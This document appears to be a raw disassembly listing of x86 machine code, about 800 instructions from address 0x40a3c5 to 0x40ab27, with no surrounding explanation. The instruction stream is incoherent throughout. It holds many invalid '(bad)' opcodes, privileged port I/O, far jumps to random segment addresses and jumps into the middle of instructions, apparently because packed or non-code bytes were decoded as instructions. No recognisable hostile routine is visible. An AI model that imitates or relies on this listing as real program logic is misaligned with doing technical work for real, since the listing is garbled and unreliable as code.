  40a3c5:	xchg   edi,eax
  40a3c6:	mov    ds:0xaf8dde6e,eax
  40a3cb:	pop    eax
  40a3cc:	aam    0x26
  40a3ce:	repz inc esp
  40a3d0:	es pop eax
  40a3d2:	push   ss
  40a3d3:	mov    eax,ds:0xb81dd07c
  40a3d8:	mov    ecx,0x51326860
  40a3dd:	or     al,0x2e
  40a3df:	lds    esp,FWORD PTR es:[ebx+0x93192eb]
  40a3e6:	repnz nop
  40a3e8:	sbb    BYTE PTR [edx+0x4],ah
  40a3eb:	fcomp  st(6)
  40a3ed:	sti    
  40a3ee:	xchg   ebx,eax
  40a3ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3f0:	xchg   esi,eax
  40a3f1:	jb     0x40a453
  40a3f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3f4:	pop    esi
  40a3f5:	xchg   ebp,eax
  40a3f6:	pop    ds
  40a3f7:	inc    esp
  40a3f8:	sahf   
  40a3f9:	sub    cl,BYTE PTR [edx+0x51]
  40a3fc:	dec    eax
  40a3fd:	mov    edi,0x57cdeb2f
  40a402:	dec    eax
  40a403:	cmc    
  40a404:	je     0x40a391
  40a406:	out    dx,al
  40a407:	push   es
  40a408:	in     eax,0x29
  40a40a:	mov    cl,0xdb
  40a40c:	pop    esi
  40a40d:	jmp    0xfc31:0xaa68547c
  40a414:	push   edx
  40a415:	mov    cl,0x5
  40a417:	repnz sub ah,BYTE PTR [ecx-0x64]
  40a41b:	pop    edi
  40a41c:	sbb    edx,edi
  40a41e:	jb     0x40a3ae
  40a420:	fs fucom st(7)
  40a423:	ret    
  40a424:	div    BYTE PTR [ebx-0x2271f80a]
  40a42a:	push   cs
  40a42b:	jge    0x40a47a
  40a42d:	popa   
  40a42e:	aam    0x36
  40a430:	and    ecx,DWORD PTR [eax+0x2d394856]
  40a436:	in     eax,dx
  40a437:	dec    ebx
  40a438:	je     0x40a3de
  40a43a:	inc    esi
  40a43b:	pop    ecx
  40a43c:	inc    ebx
  40a43d:	pushf  
  40a43e:	push   esi
  40a43f:	mov    cl,0x5f
  40a441:	and    BYTE PTR es:[ecx+0x26f0481b],0xf3
  40a449:	js     0x40a41c
  40a44b:	mov    bh,0x5e
  40a44d:	inc    ebp
  40a44e:	mov    al,ds:0xe4a5eacb
  40a453:	nop
  40a454:	mov    dl,0x60
  40a456:	or     esi,DWORD PTR [esi-0x37]
  40a459:	jnp    0x40a3e3
  40a45b:	sub    al,ah
  40a45d:	jo     0x40a44d
  40a45f:	xor    BYTE PTR [ecx*1+0x5615005f],ch
  40a466:	adc    DWORD PTR [eax-0x1da17b11],edx
  40a46c:	inc    edi
  40a46d:	leave  
  40a46e:	pop    es
  40a46f:	clc    
  40a470:	cmp    BYTE PTR [ecx+0x385e7a5c],bh
  40a476:	addr16 sbb eax,0x2df90084
  40a47c:	pop    ecx
  40a47d:	mov    edi,0xdffda0f6
  40a482:	cmp    DWORD PTR [eax+0x79fb67a8],ecx
  40a488:	pop    esi
  40a489:	inc    ebx
  40a48a:	in     eax,0xaf
  40a48c:	outs   dx,BYTE PTR ds:[esi]
  40a48d:	adc    al,dh
  40a48f:	sbb    DWORD PTR [ecx+0x5e],esp
  40a492:	mov    ah,0xa8
  40a494:	sbb    eax,0xa90f15b3
  40a499:	cdq    
  40a49a:	jp     0x40a45d
  40a49c:	daa    
  40a49d:	adc    dh,bh
  40a49f:	pop    ss
  40a4a0:	jl     0x40a452
  40a4a2:	in     al,dx
  40a4a3:	xchg   ecx,eax
  40a4a4:	cwde   
  40a4a5:	stos   BYTE PTR es:[edi],al
  40a4a6:	test   BYTE PTR [eax-0x4d],dh
  40a4a9:	inc    eax
  40a4aa:	int3   
  40a4ab:	fdivr  st(6),st
  40a4ad:	pusha  
  40a4ae:	inc    ecx
  40a4af:	xchg   edi,eax
  40a4b0:	out    0x8d,eax
  40a4b2:	fadd   QWORD PTR [edx-0x1a]
  40a4b5:	int3   
  40a4b6:	out    dx,eax
  40a4b7:	inc    ebx
  40a4b8:	sub    DWORD PTR ds:0x340220dd,edi
  40a4be:	add    al,al
  40a4c0:	mov    edx,0xcee90c60
  40a4c5:	or     eax,0xa11f597b
  40a4ca:	out    dx,al
  40a4cb:	jbe    0x40a4ff
  40a4cd:	fild   WORD PTR [eax-0x687028bf]
  40a4d3:	test   al,0xdf
  40a4d5:	mov    cl,0x7e
  40a4d7:	inc    ebx
  40a4d8:	dec    edx
  40a4d9:	out    0xee,al
  40a4db:	mov    BYTE PTR [ecx],ch
  40a4dd:	mov    ss,WORD PTR [ebp-0x70]
  40a4e0:	pop    esi
  40a4e1:	aam    0x8
  40a4e3:	out    dx,eax
  40a4e4:	or     dl,BYTE PTR [edx+0x606f7c1e]
  40a4ea:	mov    dh,0xb
  40a4ec:	jo     0x40a4bb
  40a4ee:	ror    DWORD PTR ds:0x9de771a2,0x4
  40a4f5:	pop    edi
  40a4f6:	inc    ebx
  40a4f7:	mov    gs,WORD PTR [esi+0x2f]
  40a4fa:	jecxz  0x40a4bf
  40a4fc:	jae    0x40a55e
  40a4fe:	retf   
  40a4ff:	into   
  40a500:	cdq    
  40a501:	fs jno 0x40a4a6
  40a504:	adc    al,BYTE PTR [edx-0x7ba1cc62]
  40a50a:	daa    
  40a50b:	jmp    0x5e4b:0xa7839098
  40a512:	adc    al,0x26
  40a514:	fld    TBYTE PTR [ecx-0x2e9018d0]
  40a51a:	jle    0x40a551
  40a51c:	cmp    al,0x8f
  40a51e:	ret    
  40a51f:	pop    ebp
  40a520:	mov    dh,0xec
  40a522:	out    dx,al
  40a523:	je     0x40a526
  40a525:	and    DWORD PTR [esi+0x5054c457],eax
  40a52b:	lock fs popf 
  40a52e:	test   al,0x6a
  40a530:	adc    BYTE PTR [ecx+0x71],al
  40a533:	out    dx,eax
  40a534:	mov    dl,0x69
  40a536:	cs test al,0x4c
  40a539:	jnp    0x40a4eb
  40a53b:	(bad)  
  40a53d:	adc    ch,BYTE PTR [esi-0x46ccf358]
  40a543:	scas   al,BYTE PTR es:[edi]
  40a544:	xor    DWORD PTR [ecx+0x4f22970a],ecx
  40a54a:	out    dx,al
  40a54b:	push   ds
  40a54c:	inc    esi
  40a54d:	sbb    BYTE PTR [edi],bl
  40a54f:	dec    esi
  40a550:	mov    cl,0x60
  40a552:	test   DWORD PTR [eax+0x426a79ee],eax
  40a558:	lahf   
  40a559:	ret    
  40a55a:	in     eax,dx
  40a55b:	mov    dl,0x15
  40a55d:	xlat   BYTE PTR ds:[ebx]
  40a55e:	in     eax,dx
  40a55f:	push   ds
  40a560:	imul   ecx,DWORD PTR [edx+0x2e],0xc25fc6de
  40a567:	sub    edi,edi
  40a569:	cmp    bl,ah
  40a56b:	repnz mov al,fs:0xec5e8295
  40a572:	push   ecx
  40a573:	sub    eax,edx
  40a575:	ret    
  40a576:	iret   
  40a577:	push   esp
  40a578:	cmc    
  40a579:	arpl   cx,bx
  40a57b:	int3   
  40a57c:	pop    ebx
  40a57d:	sbb    bh,BYTE PTR [esi]
  40a57f:	rcl    DWORD PTR [ecx-0x4569116e],cl
  40a585:	out    0xcd,eax
  40a587:	push   ds
  40a588:	pop    esi
  40a589:	enter  0xd48e,0x9d
  40a58d:	out    0xd8,al
  40a58f:	sbb    bl,BYTE PTR [ecx+0x29565160]
  40a595:	pusha  
  40a596:	nop
  40a597:	es sbb ch,cl
  40a59a:	out    0x4a,al
  40a59c:	pop    esi
  40a59d:	cdq    
  40a59e:	retf   0x6556
  40a5a1:	pop    es
  40a5a2:	mov    gs,WORD PTR [edi+0x535a5fe5]
  40a5a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5a9:	call   0x6ca:0x31463d34
  40a5b0:	cmp    cl,ch
  40a5b2:	outs   dx,BYTE PTR ds:[esi]
  40a5b3:	(bad)  
  40a5b4:	pop    esi
  40a5b5:	bound  esp,QWORD PTR [edi]
  40a5b7:	inc    esi
  40a5b8:	xchg   ebx,eax
  40a5b9:	mov    al,ds:0xde08a0bb
  40a5be:	sub    ecx,ebp
  40a5c0:	aam    0x3
  40a5c2:	cmp    eax,0x5baf5e3c
  40a5c7:	iret   
  40a5c8:	aaa    
  40a5c9:	add    DWORD PTR [edx+0x7823d2e9],edi
  40a5cf:	adc    DWORD PTR [eax-0x1bc9e4f0],ebx
  40a5d5:	pusha  
  40a5d6:	stc    
  40a5d7:	add    eax,0xf8507fd1
  40a5dc:	or     bl,ah
  40a5de:	and    ch,BYTE PTR [edx]
  40a5e0:	sbb    al,0xe1
  40a5e2:	mov    esp,0xac522884
  40a5e7:	int    0x85
  40a5e9:	pusha  
  40a5ea:	cmp    al,0x24
  40a5ec:	or     eax,DWORD PTR [edx-0x79017a51]
  40a5f2:	out    dx,al
  40a5f3:	imul   edi,DWORD PTR [ebx],0xa68a8af7
  40a5f9:	or     al,al
  40a5fb:	mov    al,ds:0x81ff91ea
  40a600:	fiadd  DWORD PTR [edx+0x27]
  40a603:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a604:	pop    edx
  40a605:	inc    dx
  40a607:	lahf   
  40a608:	int3   
  40a609:	mov    ah,BYTE PTR [edi]
  40a60b:	cmp    BYTE PTR [ebx*1-0x666126b6],dh
  40a612:	fs (bad) 
  40a614:	cmc    
  40a615:	pusha  
  40a616:	stos   DWORD PTR es:[edi],eax
  40a617:	xor    DWORD PTR [ebp+eax*4+0x7fde21aa],edx
  40a61e:	sahf   
  40a61f:	mov    bl,0x5e
  40a621:	add    DWORD PTR [ebx],edx
  40a623:	outs   dx,BYTE PTR ds:[esi]
  40a624:	sbb    esp,DWORD PTR [edi-0x34a23764]
  40a62a:	cld    
  40a62b:	mov    al,ds:0x8271fb7c
  40a630:	add    BYTE PTR [edi-0x12],dh
  40a633:	imul   edi,DWORD PTR [ebx+0x3a11b1e0],0xfffffff4
  40a63a:	aaa    
  40a63b:	mov    eax,ds:0x52b63f1
  40a640:	push   ebx
  40a641:	push   esp
  40a642:	mov    al,ds:0x88a335b7
  40a647:	mov    fs,WORD PTR [esi]
  40a649:	adc    eax,0x879ba6e7
  40a64e:	out    dx,al
  40a64f:	enter  0xd198,0xe7
  40a653:	mov    al,ds:0xd03a6cf7
  40a658:	stos   DWORD PTR es:[edi],eax
  40a659:	mov    dh,0x7c
  40a65b:	or     al,0x5e
  40a65d:	adc    cl,dh
  40a65f:	loop   0x40a694
  40a661:	shl    DWORD PTR [edi-0x229ea023],1
  40a667:	pop    esi
  40a668:	dec    ecx
  40a669:	fs in  eax,dx
  40a66b:	push   edi
  40a66c:	push   es
  40a66d:	and    ch,dh
  40a66f:	gs xchg esp,eax
  40a671:	shl    DWORD PTR [edx],1
  40a673:	and    DWORD PTR [edx+0x7712a99d],edx
  40a679:	pusha  
  40a67a:	jge    0x40a67d
  40a67c:	dec    esp
  40a67d:	lahf   
  40a67e:	mov    ebx,DWORD PTR [ebp*1+0x2a82ed40]
  40a685:	mul    edi
  40a687:	outs   dx,DWORD PTR ds:[esi]
  40a688:	push   ds
  40a689:	mov    ecx,0x49a3402a
  40a68e:	in     al,dx
  40a68f:	dec    esp
  40a690:	sbb    eax,0xb9343160
  40a695:	jbe    0x40a62b
  40a697:	pusha  
  40a698:	mov    fs,WORD PTR [ebx+0x2c]
  40a69b:	mov    cl,0x63
  40a69d:	or     ebx,DWORD PTR cs:0x54ae23bf
  40a6a4:	inc    ebx
  40a6a5:	jmp    0x1a9f:0x60b7e74d
  40a6ac:	pushf  
  40a6ad:	or     ah,BYTE PTR [ebp+ebp*1-0x6f115d18]
  40a6b4:	rcl    BYTE PTR [esp+edx*4],0xde
  40a6b8:	pop    ss
  40a6b9:	cmp    eax,0x5834a124
  40a6be:	scas   eax,DWORD PTR es:[edi]
  40a6bf:	leave  
  40a6c0:	adc    bl,cl
  40a6c2:	in     al,0xe1
  40a6c4:	pop    edi
  40a6c5:	push   ecx
  40a6c6:	inc    edx
  40a6c7:	jg     0x40a725
  40a6c9:	xor    edi,DWORD PTR [ebp+edx*1-0x658f50a2]
  40a6d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6d2:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6d4:	cmp    BYTE PTR [edx],0x26
  40a6d7:	std    
  40a6d8:	fadd   DWORD PTR [eax]
  40a6da:	rol    DWORD PTR [edx+ebx*2-0x32],0xee
  40a6df:	cmp    DWORD PTR [ecx-0x1e55f7c1],esi
  40a6e5:	push   0xfffffffb
  40a6e7:	jmp    0xd1cb:0xd2ba611c
  40a6ee:	dec    edi
  40a6ef:	pop    ebp
  40a6f0:	cmp    eax,0x3b43ee8e
  40a6f5:	hlt    
  40a6f6:	div    DWORD PTR [edx]
  40a6f8:	ret    
  40a6f9:	push   edi
  40a6fa:	xor    BYTE PTR [edx+0x57ee1008],ch
  40a700:	sbb    al,0x5a
  40a702:	hlt    
  40a703:	fdivr  QWORD PTR [eax-0x1b]
  40a706:	jmp    0x40a704
  40a708:	shr    dl,0x5d
  40a70b:	pop    ebp
  40a70c:	imul   esp,DWORD PTR [eax+0x60bfee2b],0x2e29dfed
  40a716:	icebp  
  40a717:	fidivr WORD PTR [ebp-0x6b]
  40a71a:	out    dx,al
  40a71b:	add    eax,0xf85fa534
  40a720:	inc    esi
  40a721:	mov    ds:0x168ba0f7,eax
  40a726:	mov    WORD PTR [ebx+0x62660bff],?
  40a72c:	arpl   WORD PTR [eax],di
  40a72e:	dec    BYTE PTR [edx-0x67]
  40a731:	xor    ah,BYTE PTR [ebx+0x41]
  40a734:	add    esi,DWORD PTR [esi+0x612102df]
  40a73a:	call   0xab257c93
  40a73f:	pop    es
  40a740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a741:	xchg   esp,eax
  40a742:	in     eax,dx
  40a743:	add    al,0xc
  40a745:	inc    eax
  40a746:	outs   dx,BYTE PTR ds:[esi]
  40a747:	fldenv [ecx-0x3763cd66]
  40a74d:	pusha  
  40a74e:	inc    esp
  40a74f:	fidiv  DWORD PTR [edi+0x6cec04af]
  40a755:	xchg   ecx,eax
  40a756:	lock mov edi,DWORD PTR [eax]
  40a759:	shr    DWORD PTR [edi-0x213569c0],cl
  40a75f:	sbb    DWORD PTR [esi+ebp*2],esi
  40a762:	push   0x15
  40a764:	sbb    al,0x45
  40a766:	jne    0x40a7d1
  40a768:	xor    ah,BYTE PTR [ecx-0x1dad06d5]
  40a76e:	mov    al,ds:0x7be75e63
  40a773:	mov    esp,0xa0e1db20
  40a778:	je     0x40a7d1
  40a77a:	pop    ebp
  40a77b:	xor    al,0xc
  40a77d:	out    0xed,al
  40a77f:	push   ebx
  40a780:	pop    esi
  40a781:	mov    ah,0xe9
  40a783:	and    eax,0x2abd3a5c
  40a788:	mov    ebx,0x9366225f
  40a78d:	(bad)  
  40a78e:	aam    0x9f
  40a790:	xchg   esi,eax
  40a791:	cwde   
  40a792:	lahf   
  40a793:	add    DWORD PTR [esi+0x2a],ebx
  40a796:	mov    al,ds:0xdaa42d0f
  40a79b:	mov    edi,0xdd5bd132
  40a7a0:	sbb    bh,ch
  40a7a2:	out    dx,al
  40a7a3:	stos   BYTE PTR es:[edi],al
  40a7a4:	ret    
  40a7a5:	mov    esp,0x2dcf297c
  40a7aa:	out    dx,al
  40a7ab:	pop    edx
  40a7ac:	or     ebx,ebx
  40a7ae:	mov    ds:0xcddc057f,al
  40a7b3:	mov    al,ds:0xa8820158
  40a7b8:	das    
  40a7b9:	rcr    DWORD PTR [eax-0x78e2a14a],1
  40a7bf:	(bad)  
  40a7c0:	and    eax,0xa46c24b4
  40a7c5:	pop    ebp
  40a7c6:	xor    al,0xad
  40a7c8:	mov    ebp,0xae8f5391
  40a7cd:	clc    
  40a7ce:	cmc    
  40a7cf:	or     edx,DWORD PTR [ebx+0x68]
  40a7d2:	loope  0x40a776
  40a7d4:	cmp    DWORD PTR [ebx],ecx
  40a7d6:	cmp    DWORD PTR [ebx+eiz*1-0x21fc3f2a],esp
  40a7dd:	cmp    al,0xde
  40a7df:	je     0x40a817
  40a7e1:	jo     0x40a7f4
  40a7e3:	and    DWORD PTR [esi+eiz*1+0x47],esi
  40a7e7:	call   0xa21414de
  40a7ec:	inc    esp
  40a7ed:	mov    edi,0x3d9eb2a8
  40a7f2:	sahf   
  40a7f3:	pop    eax
  40a7f4:	jbe    0x40a83d
  40a7f6:	scas   eax,DWORD PTR es:[edi]
  40a7f7:	add    DWORD PTR [esi+0x65],ebx
  40a7fa:	test   al,bh
  40a7fc:	out    0xcd,al
  40a7fe:	xor    DWORD PTR [edi],0x664760a1
  40a804:	or     al,0xef
  40a806:	xchg   DWORD PTR [ecx],edi
  40a808:	xchg   esi,eax
  40a809:	xor    esp,edi
  40a80b:	aaa    
  40a80c:	push   ebx
  40a80d:	lea    edi,[edx-0x791b714b]
  40a813:	scas   al,BYTE PTR es:[edi]
  40a814:	bound  esp,QWORD PTR [ecx-0x48]
  40a817:	pop    ebp
  40a818:	xchg   DWORD PTR [edx+eax*2-0x10febd11],edx
  40a81f:	fmul   QWORD PTR [ebp+0x44689895]
  40a825:	cmpxchg BYTE PTR [edi],dl
  40a828:	jbe    0x40a81f
  40a82a:	ret    0xc5b5
  40a82d:	pusha  
  40a82e:	aaa    
  40a82f:	inc    esp
  40a830:	push   0xffffffe0
  40a832:	leave  
  40a833:	daa    
  40a834:	fcom   QWORD PTR [ecx+0x46]
  40a837:	in     eax,0x12
  40a839:	mov    ch,0xce
  40a83b:	sti    
  40a83c:	aad    0xd2
  40a83e:	adc    DWORD PTR [ecx],edx
  40a840:	pop    esi
  40a841:	sbb    ebp,edx
  40a843:	in     eax,dx
  40a844:	pop    ds
  40a845:	push   edx
  40a846:	dec    edi
  40a847:	dec    eax
  40a848:	scas   al,BYTE PTR es:[edi]
  40a849:	pusha  
  40a84a:	adc    eax,0xbe466b99
  40a84f:	aad    0x7c
  40a851:	arpl   WORD PTR [edx+edi*2],sp
  40a854:	lods   eax,DWORD PTR ds:[esi]
  40a855:	pusha  
  40a856:	mov    fs,WORD PTR [esi-0x193b9546]
  40a85c:	ins    BYTE PTR es:[edi],dx
  40a85d:	pusha  
  40a85e:	hlt    
  40a85f:	mov    ebp,0x8553353e
  40a864:	out    0x2e,al
  40a866:	out    dx,al
  40a867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a868:	push   edi
  40a869:	fwait
  40a86a:	or     ebp,DWORD PTR [esi]
  40a86c:	and    ebp,DWORD PTR [eax-0x8095f2a]
  40a872:	sahf   
  40a873:	lds    edx,FWORD PTR [ebx-0x21]
  40a876:	adc    al,0xd1
  40a878:	pop    esi
  40a879:	rcr    DWORD PTR [edx+0x58208062],0xda
  40a880:	mov    al,ds:0xfa2d4f60
  40a885:	(bad)  
  40a886:	popa   
  40a887:	int    0x3
  40a889:	jl     0x40a87b
  40a88b:	fstp   TBYTE PTR [esi]
  40a88d:	iret   
  40a88e:	lds    ebp,FWORD PTR [esi+0x11da19e8]
  40a894:	pop    ebp
  40a895:	ds jle 0x40a823
  40a898:	push   ss
  40a899:	(bad)  
  40a89a:	fiadd  WORD PTR [edi]
  40a89c:	lahf   
  40a89d:	pusha  
  40a89e:	sub    eax,0xba7fbb45
  40a8a3:	in     al,0x68
  40a8a5:	jno    0x40a895
  40a8a7:	push   0x3a174506
  40a8ac:	pusha  
  40a8ad:	mov    eax,0xe6a5a25c
  40a8b2:	nop
  40a8b3:	(bad)  
  40a8b4:	xchg   ebp,eax
  40a8b5:	cli    
  40a8b6:	fidiv  WORD PTR [eax+0x4b]
  40a8b9:	xchg   edi,eax
  40a8ba:	out    dx,al
  40a8bb:	xchg   ebp,eax
  40a8bc:	dec    edi
  40a8bd:	xchg   BYTE PTR gs:[eax],dl
  40a8c0:	push   cs
  40a8c1:	xor    eax,0x5720a0ec
  40a8c6:	xor    al,ch
  40a8c8:	fs (bad) 
  40a8ca:	pusha  
  40a8cb:	mov    ds:0x16e09d5e,al
  40a8d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8d1:	mov    edx,0x60dcb749
  40a8d6:	adc    eax,0x3ac424f9
  40a8db:	in     eax,0xa4
  40a8dd:	dec    eax
  40a8de:	fcom   DWORD PTR [edi+0x1cb4655e]
  40a8e4:	loope  0x40a956
  40a8e6:	int    0x7b
  40a8e8:	test   DWORD PTR [eax+0x11],esp
  40a8eb:	mov    edi,0x41690ab6
  40a8f0:	add    ebx,DWORD PTR [ebx+0x485f6ee1]
  40a8f6:	add    ecx,DWORD PTR [edx+0xd]
  40a8f9:	int3   
  40a8fa:	inc    edi
  40a8fb:	jns    0x40a8d8
  40a8fd:	ins    DWORD PTR es:[edi],dx
  40a8fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8ff:	mov    al,ds:0x352cee3b
  40a904:	sbb    al,BYTE PTR [edi]
  40a906:	(bad)  
  40a908:	xor    bh,BYTE PTR [eax+0x43f875a4]
  40a90e:	out    dx,al
  40a90f:	stos   BYTE PTR es:[edi],al
  40a910:	pmulhuw mm3,QWORD PTR ds:0x801b057
  40a917:	mov    eax,ds:0x4dc92a59
  40a91c:	sbb    ebx,DWORD PTR [ebx]
  40a91e:	shl    BYTE PTR [esi+ebx*2],1
  40a921:	xchg   ebp,eax
  40a922:	jns    0x40a8f6
  40a924:	push   esp
  40a925:	rol    DWORD PTR [ecx+0x1160df46],1
  40a92b:	pop    eax
  40a92c:	mov    edx,es
  40a92e:	jmp    0xee66ef62
  40a933:	loopne 0x40a935
  40a935:	into   
  40a936:	and    ah,BYTE PTR [esp+eax*2-0x3b]
  40a93a:	adc    esp,DWORD PTR [ecx-0x2423ecd8]
  40a940:	fcomp  st(5)
  40a942:	(bad)  
  40a943:	out    0x59,al
  40a945:	jl     0x40a976
  40a947:	mov    edx,DWORD PTR ds:0xf5a22e98
  40a94d:	jae    0x40a948
  40a94f:	mov    al,ds:0xb859ffb1
  40a954:	jo     0x40a8e8
  40a956:	add    edi,esp
  40a958:	into   
  40a959:	push   esi
  40a95a:	out    dx,al
  40a95b:	cli    
  40a95c:	and    bh,BYTE PTR [edi]
  40a95e:	inc    edx
  40a95f:	xchg   esp,eax
  40a960:	sub    BYTE PTR [ebx-0x74],dh
  40a963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a964:	fmul   DWORD PTR [esp+eax*1+0x7c]
  40a968:	lds    ebx,FWORD PTR [ebp+0x6b]
  40a96b:	or     DWORD PTR [ecx],ebp
  40a96d:	cld    
  40a96e:	ds popa 
  40a970:	jge    0x40a98a
  40a972:	out    dx,eax
  40a973:	mov    dh,0xf7
  40a975:	adc    BYTE PTR [eax+0x1560af35],0x9c
  40a97c:	out    0x8f,al
  40a97e:	in     al,0xba
  40a980:	or     DWORD PTR [esi-0x62],ebx
  40a983:	mov    BYTE PTR ds:0x8e8e7773,al
  40a989:	mov    edi,0x4674fbb2
  40a98e:	dec    edx
  40a98f:	pusha  
  40a990:	out    dx,al
  40a991:	dec    esp
  40a992:	(bad)  [ebp+0x5e]
  40a995:	(bad)  
  40a996:	je     0x40aa0d
  40a998:	push   esi
  40a999:	in     al,dx
  40a99a:	shl    DWORD PTR [ebp+0x4b],0x61
  40a99e:	adc    ecx,DWORD PTR [eax-0x32]
  40a9a1:	test   BYTE PTR [ebp*8+0x1722c889],dh
  40a9a8:	(bad)  
  40a9a9:	or     BYTE PTR [ecx],dl
  40a9ab:	mov    eax,ds:0xcd7bd4c4
  40a9b0:	cwde   
  40a9b1:	and    esi,0xffffffdb
  40a9b4:	pop    edi
  40a9b5:	icebp  
  40a9b6:	call   FWORD PTR [edx]
  40a9b8:	pop    esi
  40a9b9:	lds    esp,FWORD PTR [eax+0x4]
  40a9bc:	sbb    eax,0xd9355f68
  40a9c1:	inc    ebx
  40a9c2:	outs   dx,DWORD PTR ds:[esi]
  40a9c3:	(bad)  
  40a9c4:	retf   
  40a9c5:	mov    al,ds:0xb26f2b26
  40a9ca:	in     eax,dx
  40a9cb:	mov    fs,WORD PTR [ebp+0x35]
  40a9ce:	sub    BYTE PTR [ebx+edi*8-0x2ae87f20],0xb8
  40a9d6:	cmp    eax,esi
  40a9d8:	mov    ch,0x44
  40a9da:	push   ebx
  40a9db:	fldenv [edx+0x43]
  40a9de:	dec    eax
  40a9df:	mov    eax,ds:0xfce3deb7
  40a9e4:	push   esi
  40a9e5:	jl     0x40a9d2
  40a9e7:	ret    
  40a9e8:	lds    esi,FWORD PTR [ebx]
  40a9ea:	adc    al,0x1e
  40a9ec:	lahf   
  40a9ed:	add    BYTE PTR [ebx-0x41],dl
  40a9f0:	xor    esp,DWORD PTR [ecx-0x80]
  40a9f3:	cwde   
  40a9f4:	nop
  40a9f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9f6:	dec    edi
  40a9f7:	adc    eax,0x5edc0e65
  40a9fc:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40a9fe:	js     0x40a9e0
  40aa00:	lods   al,BYTE PTR ds:[esi]
  40aa01:	inc    eax
  40aa02:	shl    eax,1
  40aa04:	jo     0x40aa59
  40aa06:	lds    esp,FWORD PTR [eax-0x24a42ccf]
  40aa0c:	lahf   
  40aa0d:	jo     0x40aa56
  40aa0f:	sbb    al,0x63
  40aa11:	adc    al,0x7c
  40aa13:	sbb    cl,dh
  40aa15:	xor    ah,BYTE PTR [ecx+eiz*4+0x50b5f6f4]
  40aa1c:	shl    DWORD PTR [ecx],cl
  40aa1e:	xor    esi,DWORD PTR [edi+0x75]
  40aa21:	pusha  
  40aa22:	push   cs
  40aa23:	xor    al,0x78
  40aa25:	lock (bad) 
  40aa27:	cmc    
  40aa28:	add    DWORD PTR [edx],esp
  40aa2a:	out    dx,al
  40aa2b:	xchg   esi,eax
  40aa2c:	enter  0x2ba9,0xb5
  40aa30:	in     eax,dx
  40aa31:	xchg   esp,eax
  40aa32:	rcr    BYTE PTR [edi-0x7b5e644d],0x7e
  40aa39:	in     al,0x2c
  40aa3b:	cmp    ah,BYTE PTR [ecx+eax*2-0x6c5817f0]
  40aa42:	out    dx,al
  40aa43:	fwait
  40aa44:	sub    al,BYTE PTR [ebx-0x2b]
  40aa47:	pop    edi
  40aa48:	daa    
  40aa49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa4a:	out    dx,eax
  40aa4b:	mov    al,ds:0x7a8763c3
  40aa50:	imul   edi,DWORD PTR [ebx+eax*2-0x10b40728],0x30212dd9
  40aa5b:	loope  0x40a9ec
  40aa5d:	or     al,BYTE PTR [edi]
  40aa5f:	cdq    
  40aa60:	mov    edx,0x6d07c460
  40aa65:	fwait
  40aa66:	dec    esp
  40aa67:	mov    BYTE PTR [esi],al
  40aa69:	mov    ds:0xfeda70eb,eax
  40aa6e:	enter  0x3d38,0x91
  40aa72:	fistp  DWORD PTR [esi+eax*4]
  40aa75:	jnp    0x40aa19
  40aa77:	rcl    BYTE PTR [ebx+ecx*4-0x4b62e415],cl
  40aa7e:	push   eax
  40aa7f:	xor    edx,ebx
  40aa81:	hlt    
  40aa82:	fmul   QWORD PTR [esi-0x1be337a0]
  40aa88:	imul   edx,DWORD PTR [ebx*2-0x7db849a1],0xf2fd5e2a
  40aa93:	xlat   BYTE PTR ds:[ebx]
  40aa94:	cmovb  esp,DWORD PTR [edi]
  40aa97:	xor    al,0xc1
  40aa99:	pusha  
  40aa9a:	cs jmp 0x876d:0x41db6e59
  40aaa2:	or     cl,BYTE PTR [eax-0x54]
  40aaa5:	cli    
  40aaa6:	out    dx,al
  40aaa7:	mov    ds:0x9ecccb3b,al
  40aaac:	pop    edx
  40aaad:	rol    DWORD PTR [edi],1
  40aaaf:	imul   ebx,ebx,0x60
  40aab2:	lods   eax,DWORD PTR gs:[esi]
  40aab4:	data16 shl BYTE PTR ds:[edx-0x4f317037],cl
  40aabc:	and    al,0x47
  40aabe:	xor    DWORD PTR [esi+0x73],esp
  40aac1:	pusha  
  40aac2:	pop    ebp
  40aac3:	xchg   ebx,eax
  40aac4:	xlat   BYTE PTR ds:[ebx]
  40aac5:	rcl    BYTE PTR [ecx+0x76],0x15
  40aac9:	in     eax,0xee
  40aacb:	lea    ebp,[eax+0x43]
  40aace:	push   esi
  40aad0:	cs add eax,0x368ca0ce
  40aad6:	mov    al,0x26
  40aad8:	inc    esi
  40aad9:	fld    DWORD PTR [ebx-0x80]
  40aadc:	pop    ebx
  40aadd:	push   esi
  40aade:	cdq    
  40aadf:	pop    edx
  40aae0:	dec    esp
  40aae1:	or     esi,ebx
  40aae3:	out    0xcd,al
  40aae5:	(bad)  
  40aae6:	aad    0xa0
  40aae8:	fwait
  40aae9:	ror    dh,0x5d
  40aaec:	popa   
  40aaed:	push   eax
  40aaee:	jle    0x40aabf
  40aaf0:	cmc    
  40aaf1:	cwde   
  40aaf2:	out    dx,al
  40aaf3:	fcmovb st,st(5)
  40aaf5:	aam    0x42
  40aaf7:	pop    ss
  40aaf8:	mov    gs,WORD PTR [ebx-0x70986111]
  40aafe:	adc    DWORD PTR [eax+0x6ea676fe],esi
  40ab04:	push   eax
  40ab05:	cmp    eax,0x2035c4ed
  40ab0a:	xlat   BYTE PTR ds:[ebx]
  40ab0b:	pop    edi
  40ab0c:	mov    al,0xcf
  40ab0e:	push   esi
  40ab0f:	sbb    eax,0xa158bf58
  40ab14:	adc    al,BYTE PTR [esi+0x20e397c1]
  40ab1a:	and    BYTE PTR [eax-0x7448d5a2],bh
  40ab20:	or     bl,0x4e
  40ab23:	mov    dl,0xf2
  40ab25:	pusha  
  40ab26:	scas   eax,DWORD PTR es:[edi]
  40ab27:	data16 aam 0x9b
